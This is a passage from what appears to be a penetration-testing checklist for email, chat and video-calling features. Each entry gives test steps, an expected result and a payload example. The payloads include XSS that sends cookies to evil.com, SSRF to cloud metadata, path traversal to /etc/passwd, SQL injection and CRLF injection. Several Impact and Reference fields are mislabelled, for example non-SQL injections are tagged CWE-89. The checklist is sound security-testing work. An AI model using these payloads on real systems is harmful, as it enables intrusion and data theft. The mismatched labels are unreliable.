**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-072 — Transactional Email Phishing via Content Injection
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Trigger a transactional email like order confirmation or password reset. 2. Inject HTML or links in user-controlled fields that appear in the email. 3. Check if phishing content renders.

**Expected Result:** Application must sanitize all user-provided content before including in transactional email bodies.

**Payload Example:**

```
Set shipping_name=<a href='https://evil.com/phishing'>Click to verify your account</a> in order details
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Email Client

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-073 — Transactional Email Replay Attack
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Capture a transactional email trigger request. 2. Replay the same request multiple times. 3. Check if duplicate transactional emails are sent without rate limiting.

**Expected Result:** Application must implement idempotency checks to prevent duplicate transactional email sends from replayed requests.

**Payload Example:**

```
Replay POST /api/transactional-email/send with same parameters 50 times
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-074 — Sensitive Data in Transactional Email
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Trigger all types of transactional emails. 2. Review each email for sensitive data exposure. 3. Check for plain-text passwords or full card numbers or internal system information.

**Expected Result:** Transactional emails must mask sensitive data and never contain plain-text credentials or full payment instrument details.

**Payload Example:**

```
Review password reset email for plain-text password;order email for full card number;account email for internal IDs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-075 — Transactional Email Open Tracking Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Receive transactional emails. 2. Inspect for tracking pixels or unique identifiers. 3. Check if open tracking reveals user behavior to third parties.

**Expected Result:** Transactional emails should minimize tracking and comply with privacy regulations regarding email tracking.

**Payload Example:**

```
Search email HTML source for 1x1 pixel images;unique tracking parameters;third-party tracking domains
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Email Client;Burp Suite

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## COMM-076 — Transactional Email SSRF via Template Images
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. If transactional emails allow custom image URLs inject internal URLs. 2. Trigger the email. 3. Check if the email server fetches the internal resource when rendering the email.

**Expected Result:** Application must validate and whitelist all image URLs used in transactional email templates.

**Payload Example:**

```
Set profile_image=http://169.254.169.254/latest/meta-data/ or logo_url=http://localhost:3306/ in fields included in email
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-077 — Email Template Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. If the email template name or ID is a parameter intercept and modify it. 2. Attempt path traversal to load arbitrary templates. 3. Check for file inclusion.

**Expected Result:** Application must validate template identifiers against an allowed list and prevent path traversal in template loading.

**Payload Example:**

```
template=../../../etc/passwd;template_id=../../../../app/config/database.yml
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## COMM-078 — Marketing Email Unsubscribe Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. Unsubscribe from marketing emails. 2. Check if marketing emails continue to be sent. 3. Verify if re-subscription happens without explicit consent. 4. Test CAN-SPAM/GDPR compliance.

**Expected Result:** Application must honor unsubscribe requests immediately and permanently and comply with email marketing regulations.

**Payload Example:**

```
Unsubscribe via /marketing/unsubscribe then check for continued marketing emails over 30-day period
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Email Client;Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## COMM-079 — Marketing Email List Injection
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. If the subscription form accepts email addresses inject multiple email addresses. 2. Use CRLF or comma separation to add additional recipients. 3. Check if injected addresses receive marketing emails.

**Expected Result:** Application must validate that only a single valid email address is submitted per subscription request.

**Payload Example:**

```
email=user@test.com%0d%0aCc:victim1@test.com;email=user@test.com,victim2@test.com,victim3@test.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-080 — Marketing Email Content XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. If marketing email content includes user data like name or preferences inject XSS payloads. 2. Trigger the marketing email. 3. Open in webmail. 4. Check for script execution.

**Expected Result:** Application must sanitize all user-derived content before including in marketing email templates.

**Payload Example:**

```
Set display_name=<script>alert('XSS')</script> or preferences=<img src=x onerror=alert(1)> and trigger marketing email
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter;Email Client

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-081 — Marketing Email Subscription CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. Craft a malicious page that auto-subscribes the victim to unwanted marketing email lists. 2. Lure victim to visit. 3. Check if subscription occurs without explicit consent.

**Expected Result:** Application must require explicit user action and CSRF protection for marketing email subscriptions.

**Payload Example:**

```
<img src='https://target.com/api/marketing/subscribe?email=victim@test.com&list=all'>;auto-submit subscription form
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-082 — Marketing Email Subscriber List Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. Check if marketing email subscriber endpoints expose the full subscriber list. 2. Try accessing admin subscriber management endpoints. 3. Look for data export functionality.

**Expected Result:** Application must restrict subscriber list access to authorized admin roles and prevent unauthorized data extraction.

**Payload Example:**

```
GET /api/marketing/subscribers;GET /api/admin/email-lists;GET /api/marketing/export with regular user credentials
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;DirBuster

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-083 — Email Preference Center IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. Access own email preference center. 2. Change the user identifier in the URL or request. 3. Check if another user's marketing preferences can be viewed or modified.

**Expected Result:** Application must validate user identity before displaying or modifying marketing email preferences.

**Payload Example:**

```
Change /marketing/preferences?uid=1001 to uid=1002;modify token in preference center URL
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-084 — Marketing Email Rate Abuse for Spam
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. Trigger marketing email sends via any available mechanism. 2. Target external email addresses. 3. Check if the application can be used as a spam relay.

**Expected Result:** Application must prevent abuse of email sending capabilities and implement strict controls on who can trigger marketing emails.

**Payload Example:**

```
Use subscription confirmation or referral features to send unwanted emails to arbitrary addresses at scale
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-085 — Stored XSS in Chat Messages
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send a chat message containing XSS payload. 2. Wait for the recipient to view the message. 3. Check if the script executes in the recipient's browser. 4. Test in different rendering contexts.

**Expected Result:** Application must sanitize all chat message content on input and encode on output to prevent stored XSS in messaging.

**Payload Example:**

```
message=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>;message=<img src=x onerror=alert(1)>;message=<svg/onload=alert(document.domain)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-086 — Chat Message IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Access own chat messages. 2. Change conversation_id or message_id to another user's conversation. 3. Check if messages from other conversations are accessible.

**Expected Result:** Application must verify that the authenticated user is a participant in the conversation before displaying any messages.

**Payload Example:**

```
GET /api/chat/conversations/CONV-2001/messages with non-participant credentials;GET /api/chat/messages/MSG-2001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-087 — Chat Message Injection for Impersonation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send a chat message. 2. Intercept and modify the sender_id or from_user parameter. 3. Check if the message appears to come from another user. 4. Test message spoofing.

**Expected Result:** Application must determine the message sender from the authenticated session server-side and not accept client-provided sender identifiers.

**Payload Example:**

```
Change sender_id=1001 to sender_id=1002 in POST /api/chat/send or modify from_user field
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-088 — Chat File Upload Malware
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Upload a file via chat. 2. Attempt to upload executable files or web shells disguised as images or documents. 3. Check file type validation. 4. Try to access and execute the uploaded file.

**Expected Result:** Application must validate file content type and scan for malware and store uploads outside web root without execute permissions.

**Payload Example:**

```
Upload shell.php.jpg;malware.exe.pdf;polyglot.jpg containing PHP code;file with double extension test.html.png
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;ClamAV;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## COMM-089 — Chat History Unauthorized Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Attempt to access chat history between two other users. 2. Enumerate conversation IDs. 3. Try admin chat history endpoints with regular user credentials.

**Expected Result:** Application must enforce strict access control on chat history ensuring only conversation participants can access their messages.

**Payload Example:**

```
GET /api/chat/history?between=1002&and=1003 with User A credentials;enumerate conversation IDs CONV-0001 to CONV-9999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-090 — Chat Message SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send a chat message with SQL injection payload. 2. Search chat messages using SQL injection in the search query. 3. Observe responses for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all chat message storage and retrieval operations.

**Payload Example:**

```
message=test' OR 1=1--;search_query=' UNION SELECT username;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-091 — Chat WebSocket Eavesdropping
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. If chat uses WebSocket connect to the WebSocket endpoint. 2. Try subscribing to other users' chat channels. 3. Check if messages from private conversations are visible.

**Expected Result:** Application must enforce channel-level authorization on chat WebSocket connections preventing eavesdropping.

**Payload Example:**

```
Connect to ws://target.com/chat/ws and subscribe to channel=private_chat_1002_1003 without being a participant
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-092 — Chat Rate Limiting Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send chat messages at very high frequency. 2. Check for rate limiting. 3. Attempt to bypass rate limits using multiple connections or header manipulation. 4. Test for spam potential.

**Expected Result:** Application must implement rate limiting on chat messages to prevent spam and abuse.

**Payload Example:**

```
Send 100+ messages per second;bypass with X-Forwarded-For rotation;open multiple WebSocket connections
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-093 — Chat Message Deletion IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Delete own chat message. 2. Intercept and change message_id to another user's message. 3. Check if the other user's message is deleted.

**Expected Result:** Application must verify that the authenticated user is the author of a message before allowing deletion.

**Payload Example:**

```
DELETE /api/chat/messages/MSG-2001 with non-author credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-094 — Chat CRLF Injection
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send chat messages containing CRLF characters. 2. Check if headers are injected in HTTP responses or if log injection occurs. 3. Test for HTTP response splitting.

**Expected Result:** Application must strip CRLF characters from all chat message inputs.

**Payload Example:**

```
message=Hello%0d%0aSet-Cookie:session=evil%0d%0a;message=test%0d%0aHTTP/1.1 200 OK%0d%0a
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## COMM-095 — Chat Encryption Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Capture chat traffic. 2. Verify if messages are encrypted in transit. 3. Check if end-to-end encryption is implemented when claimed. 4. Test for encryption downgrade attacks.

**Expected Result:** Chat messages must be encrypted in transit using TLS and if E2E encryption is claimed it must be verifiable and properly implemented.

**Payload Example:**

```
Capture WebSocket traffic and check for plain-text messages;attempt TLS stripping;verify E2E encryption claims
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;Burp Suite;mitmproxy

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## COMM-096 — Chat Link Preview SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send a chat message containing a URL. 2. If the application generates link previews check if it fetches the URL server-side. 3. Send internal URLs to test for SSRF.

**Expected Result:** Application must validate and restrict URLs used for link preview generation blocking access to internal network addresses.

**Payload Example:**

```
message=Check this: http://169.254.169.254/latest/meta-data/ or message=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-097 — Chat Markdown/BBCode Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. If chat supports Markdown or BBCode formatting inject malicious markup. 2. Test for XSS through Markdown rendering. 3. Check for link injection or image injection.

**Expected Result:** Application must safely render Markdown or BBCode and prevent XSS through formatting injection.

**Payload Example:**

```
[url=javascript:alert(1)]Click[/url];![img](javascript:alert(1));[Click](javascript:alert(document.cookie))
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-098 — Video Call Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Capture a video call initiation request. 2. Remove authentication tokens. 3. Attempt to join a call without valid credentials. 4. Check if unauthenticated users can access video calls.

**Expected Result:** Application must require valid authentication for initiating and joining video calls.

**Payload Example:**

```
Join ws://target.com/video/room/ROOM-1001 or POST /api/video/join/ROOM-1001 without authentication
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;wscat;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-099 — Video Call Room ID Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Note the format of video call room IDs. 2. Enumerate sequential or predictable room IDs. 3. Attempt to join active calls by guessing room IDs.

**Expected Result:** Application must use cryptographically random room identifiers and require invitation or authorization to join calls.

**Payload Example:**

```
Enumerate /api/video/join/ROOM-0001 through ROOM-9999;try joining discovered active rooms
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COMM-100 — Unauthorized Video Call Recording Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. If call recording exists access own call recordings. 2. Change recording_id or call_id to access other users' recordings. 3. Check for IDOR on recording download.

**Expected Result:** Application must verify that the user was a participant in the call before allowing access to recordings.

**Payload Example:**

```
GET /api/video/recordings/REC-2001 with non-participant credentials;enumerate recording IDs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-101 — Video Call Eavesdropping via WebRTC
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Analyze WebRTC signaling messages. 2. Check if SRTP is enforced for media streams. 3. Test for SRTP-to-RTP downgrade attacks. 4. Verify TURN/STUN server security.

**Expected Result:** Video calls must use SRTP encryption for all media streams and prevent downgrade attacks with properly secured signaling.

**Payload Example:**

```
Capture SDP offers and check for m=audio RTP/SAVPF vs RTP/AVP;test TURN server with leaked credentials
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Wireshark;WebRTC Internals;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-102 — Video Call CSRF for Auto-Answer
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Craft a malicious page that initiates or auto-accepts a video call to the victim. 2. Lure victim to visit. 3. Check if the call is established without victim's explicit consent.

**Expected Result:** Application must require explicit user action to accept video calls and implement CSRF protection on call acceptance.

**Payload Example:**

```
<script>fetch('https://target.com/api/video/accept/CALL-1001',{method:'POST',credentials:'include'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-103 — IP Address Leakage via WebRTC
**Test Category:** Information Disclosure (WSTG-CLNT-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Initiate a video call. 2. Check WebRTC ICE candidates for IP address leakage. 3. Verify if local and public IP addresses are exposed through signaling. 4. Check if TURN relay is enforced.

**Expected Result:** Application must use TURN relay servers to prevent direct IP leakage between call participants when privacy is required.

**Payload Example:**

```
Check WebRTC ICE candidates for candidate:... typ host with local IP;candidate:... typ srflx with public IP
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;WebRTC Internals

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-104 — Video Call Link Sharing Vulnerability
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Generate a video call link. 2. Share the link without authentication. 3. Check if anyone with the link can join without being invited. 4. Test for link expiration.

**Expected Result:** Application must require authentication and authorization for video call access even when using shareable links with proper expiration.

**Payload Example:**

```
Access video call link https://target.com/video/join/ROOM-TOKEN-ABC from unauthenticated browser
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Browser;Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-105 — Malicious Screen Share Content Injection
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. During a video call initiate screen sharing. 2. Check if screen share content is validated. 3. Test if a user can share misleading or malicious content that appears as system notifications.

**Expected Result:** Application must clearly identify screen-shared content and prevent it from being confused with system UI elements.

**Payload Example:**

```
Share screen displaying fake login pages or system dialogs designed to capture credentials from other participants
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing;Browser

**References:** CWE-840; PortSwigger Business logic

---

## COMM-106 — Video Call Signaling Server Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Intercept WebRTC signaling messages. 2. Inject malicious SDP parameters or modify ICE candidates. 3. Check if injected signaling data causes call disruption or redirection.

**Expected Result:** Application must validate all signaling messages and SDP parameters to prevent manipulation of call routing.

**Payload Example:**

```
Modify SDP answer to redirect media stream;inject malicious ICE candidate pointing to attacker TURN server
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-107 — XSS in Contact Form Fields
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Fill out the contact form with XSS payloads in all fields including name and email and subject and message. 2. Submit the form. 3. Check if payloads execute when admin views submissions.

